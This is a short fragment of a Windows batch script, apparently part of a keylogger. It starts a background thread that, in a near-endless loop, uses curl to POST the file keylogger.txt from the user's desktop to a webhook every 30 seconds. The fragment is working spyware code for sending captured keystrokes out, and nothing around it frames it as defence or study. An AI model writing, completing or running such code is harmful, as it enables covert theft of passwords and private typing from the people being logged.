...
start "Increment Thread" cmd /c "for /l %%i in (1,1,99999999) do (curl -d "@%userprofile%\desktop\keylogger.txt" -H "Content-Type: text/plain" -X POST http://localhost:3000/webhook & timeout /t 30 /nobreak >nul)"
:a
